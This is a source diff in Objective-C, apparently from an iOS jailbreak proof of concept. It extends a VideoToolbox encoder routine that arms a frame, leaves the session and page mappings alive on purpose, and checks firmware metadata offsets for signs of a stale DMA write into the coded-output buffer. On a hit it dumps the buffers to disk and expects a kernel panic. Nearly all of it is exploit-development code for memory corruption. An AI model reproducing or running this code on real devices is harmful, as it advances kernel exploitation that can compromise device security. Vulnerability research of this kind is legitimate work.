@@ -3728,6 +3728,40 @@ static volatile int g_dp2SampleIdx = 0;
 static volatile int g_dp2Errors = 0;
 static volatile BOOL g_dp2Armed = NO;
 
+// D-prep-2 retained canary archive: keeps ALL sample buffers from t=0
+// (pre-arm baseline through post-arm readout) so we have actual bytes
+// if any output goes anomalous — one shot before any potential fire.
+#define DPREP2_ARCHIVE_MAX 512
+static CMSampleBufferRef g_dp2Archive[DPREP2_ARCHIVE_MAX];
+static volatile int g_dp2ArchiveIdx = 0;
+static int g_dp2ArchiveArmMark = -1; // index where arming occurred
+
+static void dp2ArchiveSample(CMSampleBufferRef sbuf) {
+    if (sbuf && g_dp2ArchiveIdx < DPREP2_ARCHIVE_MAX) {
+        CFRetain(sbuf);
+        g_dp2Archive[g_dp2ArchiveIdx++] = sbuf;
+    }
+}
+
+static void dp2FreeArchive(void) {
+    for (int i = 0; i < g_dp2ArchiveIdx; i++) {
+        if (g_dp2Archive[i]) {
+            CFRelease(g_dp2Archive[i]);
+            g_dp2Archive[i] = NULL;
+        }
+    }
+    g_dp2ArchiveIdx = 0;
+    g_dp2ArchiveArmMark = -1;
+}
+
+// Q4 firmware metadata offsets in coded-output buffer (type 0x0b):
+// +0xa8 = frame# (u32), +0xac = coded_size (u32), +0x1270 = bitstream start
+// These are the sharpest hit signatures — the armed frame's own numbers.
+#define DP2_FW_FRAME_OFFSET  0xa8
+#define DP2_FW_SIZE_OFFSET   0xac
+#define DP2_FW_BS_OFFSET     0x1270
+#define DP2_FW_BS_COPY_LEN   0x9400
+
 static void dprep2Callback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
     VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
@@ -3744,6 +3778,7 @@ static void dprep2Callback(
         CFRetain(sampleBuffer);
         g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
         g_dp2SampleIdx++;
+        dp2ArchiveSample(sampleBuffer);
     }
 }
 
@@ -3767,6 +3802,17 @@ static void dp2FreeSamples(void) {
     }
     g_dp2SampleIdx = 0;
     g_dp2Errors = 0;
+}
+
+static NSData *dp2ExtractFullBlock(CMSampleBufferRef sbuf) {
+    if (!sbuf) return nil;
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
+    if (!block) return nil;
+    size_t totalLen = CMBlockBufferGetDataLength(block);
+    if (totalLen == 0) return nil;
+    NSMutableData *data = [NSMutableData dataWithLength:totalLen];
+    CMBlockBufferCopyDataBytes(block, 0, totalLen, data.mutableBytes);
+    return data;
 }
 
 static void runDPrep2(void) {
@@ -3846,6 +3892,7 @@ static void runDPrep2(void) {
 
     // Encode baseline frames (same input, same session)
     dp2FreeSamples();
+    dp2FreeArchive();
     g_dp2Armed = NO;
 
     #define DPREP2_BASELINE_FRAMES 8
@@ -3912,9 +3959,10 @@ static void runDPrep2(void) {
     INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
 
     g_dp2Armed = NO;
+    g_dp2ArchiveArmMark = g_dp2ArchiveIdx;
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
-    LOG(@"ARM time: %@", armTime);
-    os_log(dLog, "JBPoC-DPREP2-ARM %{public}@", armTime);
+    LOG(@"ARM time: %@ (archive mark: %d)", armTime, g_dp2ArchiveArmMark);
+    os_log(dLog, "JBPoC-DPREP2-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
 
     CMTime armPTS = CMTimeMake(DPREP2_BASELINE_FRAMES, 30);
     status = VTCompressionSessionEncodeFrame(session, pb,
@@ -3996,7 +4044,7 @@ static void runDPrep2(void) {
         VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
         [NSThread sleepForTimeInterval:0.5];
 
-        // Diff output against baseline variance envelope
+        // Diff output against baseline variance envelope + Q4 firmware metadata
         if (g_dp2SampleIdx > 0) {
             NSData *curBS = dp2ExtractBitstream(g_dp2Samples[0]);
             if (curBS && curBS.length > 0 && varMin && varMax) {
@@ -4005,10 +4053,51 @@ static void runDPrep2(void) {
                 int anomalies = 0;
                 int firstAnom = -1;
 
+                // PRIMARY SIGNAL (Q4): Check firmware metadata at coded-output offsets
+                // frame# at +0xa8 and coded_size at +0xac — if these match the
+                // armed frame's ordinal or show impossible values, that's the
+                // cleanest possible tell of a stale DMA write landing.
+                BOOL fwMetaHit = NO;
+                uint32_t fwFrame = 0, fwSize = 0;
+                if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                    memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
+                    memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
+                    // The armed encode was frame DPREP2_BASELINE_FRAMES (0-indexed).
+                    // If we see that frame# in a post-arm canary output, the stale
+                    // descriptor's write landed in the coded-output buffer and the
+                    // ISR memcpy'd it into this sample.
+                    uint32_t armFrameNum = DPREP2_BASELINE_FRAMES;
+                    if (fwFrame == armFrameNum && tick > 1) {
+                        fwMetaHit = YES;
+                        PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
+                             fwFrame);
+                    }
+                    // Also flag if coded_size is wildly different from baseline
+                    if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
+                        fwMetaHit = YES;
+                        PASS(@"*** Q4 SIZE HIT: coded_size at +0xac = %u (baseline max=%zu) ***",
+                             fwSize, baseMaxLen);
+                    }
+                }
+
+                // SECONDARY SIGNAL: Variance envelope check (existing)
                 for (size_t j = 0; j < len; j++) {
                     if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
                         if (anomalies == 0) firstAnom = (int)j;
                         anomalies++;
+                    }
+                }
+
+                // TERTIARY SIGNAL: +0x1270 region byte deviation
+                // The ISR copies 0x9400 bytes from kva+0x1270 — if the stale
+                // DMA wrote bitstream data, this region will diverge from baseline
+                int bsRegionAnoms = 0;
+                if (len > DP2_FW_BS_OFFSET) {
+                    size_t bsEnd = MIN(len, (size_t)(DP2_FW_BS_OFFSET + DP2_FW_BS_COPY_LEN));
+                    for (size_t j = DP2_FW_BS_OFFSET; j < bsEnd; j++) {
+                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                            bsRegionAnoms++;
+                        }
                     }
                 }
 
@@ -4021,12 +4110,15 @@ static void runDPrep2(void) {
                     }
                 }
 
-                if (anomalies > 0 || sizeAnom) {
+                if (fwMetaHit || anomalies > 0 || sizeAnom) {
                     hitCount++;
                     if (firstHitTime < 0) firstHitTime = elapsed;
-                    PASS(@"*** HIT at T+%ds (%@): %d anomalous bytes, first at 0x%x%@ ***",
-                         elapsed, now, anomalies, firstAnom,
-                         sizeAnom ? @" + SIZE CHANGE" : @"");
+                    PASS(@"*** HIT at T+%ds (%@): %d envelope, %d +0x1270-region, "
+                         @"fw_frame=%u fw_size=%u%@%@ ***",
+                         elapsed, now, anomalies, bsRegionAnoms,
+                         fwFrame, fwSize,
+                         sizeAnom ? @" SIZE_CHANGE" : @"",
+                         fwMetaHit ? @" FW_META_HIT" : @"");
 
                     // Dump first 32 anomalies
                     NSMutableString *hex = [NSMutableString string];
@@ -4039,15 +4131,54 @@ static void runDPrep2(void) {
                             dumped++;
                         }
                     }
-                    LOG(@"  Anomalies: %@", hex);
-                    [hitReport appendFormat:@"T+%ds: %d anomalies at 0x%x\n",
-                        elapsed, anomalies, firstAnom];
+                    LOG(@"  Envelope anomalies: %@", hex);
 
-                    os_log(dLog, "JBPoC-DPREP2-HIT T+%ds anomalies=%d first=0x%x size=%d",
-                           elapsed, anomalies, firstAnom, (int)sizeAnom);
+                    // Dump firmware metadata region specifically
+                    if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
+                        NSMutableString *fwHex = [NSMutableString string];
+                        size_t fwStart = DP2_FW_FRAME_OFFSET;
+                        size_t fwEnd = MIN(curBS.length, (size_t)(DP2_FW_SIZE_OFFSET + 8));
+                        for (size_t j = fwStart; j < fwEnd; j++) {
+                            [fwHex appendFormat:@"%02x", cur[j]];
+                            if ((j - fwStart + 1) % 4 == 0) [fwHex appendString:@" "];
+                        }
+                        LOG(@"  FW metadata (+0xa8..+0xb4): %@", fwHex);
+                    }
+
+                    [hitReport appendFormat:
+                        @"T+%ds: env=%d bs_region=%d fw_frame=%u fw_size=%u%s%s\n",
+                        elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
+                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];
+
+                    os_log(dLog, "JBPoC-DPREP2-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
+                           elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);
+
+                    // On hit: dump the full retained archive to disk
+                    if (hitCount == 1) {
+                        NSString *archDir = [NSHomeDirectory()
+                            stringByAppendingPathComponent:@"Documents/dprep2_archive"];
+                        [[NSFileManager defaultManager] createDirectoryAtPath:archDir
+                            withIntermediateDirectories:YES attributes:nil error:nil];
+                        for (int ai = 0; ai < g_dp2ArchiveIdx; ai++) {
+                            NSData *aBS = dp2ExtractFullBlock(g_dp2Archive[ai]);
+                            if (aBS) {
+                                NSString *label = (ai < g_dp2ArchiveArmMark) ? @"pre" :
+                                    (ai == g_dp2ArchiveArmMark) ? @"arm" : @"post";
+                                NSString *fn = [NSString stringWithFormat:
+                                    @"%@/%@_%03d.bin", archDir, label, ai];
+                                [aBS writeToFile:fn atomically:YES];
+                            }
+                        }
+                        // Also dump the current anomalous sample
+                        NSString *hitFn = [NSString stringWithFormat:
+                            @"%@/HIT_T%03d.bin", archDir, elapsed];
+                        [curBS writeToFile:hitFn atomically:YES];
+                        PASS(@"Archive dumped: %d samples to %@", g_dp2ArchiveIdx, archDir);
+                        os_log(dLog, "JBPoC-DPREP2-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
+                    }
                 } else if (elapsed <= 30 || elapsed % 30 == 0) {
-                    INFO(@"T+%03ds (%@): output OK (%zu bytes, 0 anomalies)",
-                         elapsed, now, curBS.length);
+                    INFO(@"T+%03ds (%@): OK (%zu B, fw_frame=%u fw_size=%u, 0 anomalies)",
+                         elapsed, now, curBS.length, fwFrame, fwSize);
                 }
             } else if (g_dp2Errors > 0) {
                 INFO(@"T+%03ds: encode error (errors: %d)", elapsed, g_dp2Errors);
@@ -4112,9 +4243,13 @@ static void runDPrep2(void) {
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"D-PREP-2 RESULT\nDate: %@\nARM: %@\nBaseline frames: %d\nMax bitstream: %zu\n"
+        @"D-PREP-2 RESULT (Q4-enhanced)\nDate: %@\nARM: %@\n"
+        @"Baseline frames: %d\nMax bitstream: %zu\n"
+        @"Archive samples: %d (arm mark: %d)\n"
+        @"Q4 offsets: frame#+0xa8, coded_size+0xac, bitstream+0x1270\n"
         @"Hits: %d\nFirst hit: T+%ds\nReport:\n%@\n",
         [NSDate date], armTime, baselineCount, baseMaxLen,
+        g_dp2ArchiveIdx, g_dp2ArchiveArmMark,
         hitCount, firstHitTime, hitReport];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
@@ -4146,11 +4281,14 @@ static void runDPrep2(void) {
     if (varMax) free(varMax);
     if (inputSnap) free(inputSnap);
     dp2FreeSamples();
+    // Archive intentionally NOT freed — retained for post-panic recovery
+    // dp2FreeArchive() would destroy the evidence
     // Intentionally NOT releasing session, pb — keep PTEs alive
     g_phase2Running = NO;
 
-    PASS(@"D-PREP-2 readout complete. Expect panic ~90-160s post-arm.");
+    PASS(@"D-PREP-2 readout complete. Archive: %d samples retained.", g_dp2ArchiveIdx);
     LOG(@"Session left alive — fire hits mapped PTEs (not an unmap fault).");
+    LOG(@"Q4 signals: frame# at +0xa8, coded_size at +0xac, bitstream at +0x1270.");
 }
 
 // ============================================================
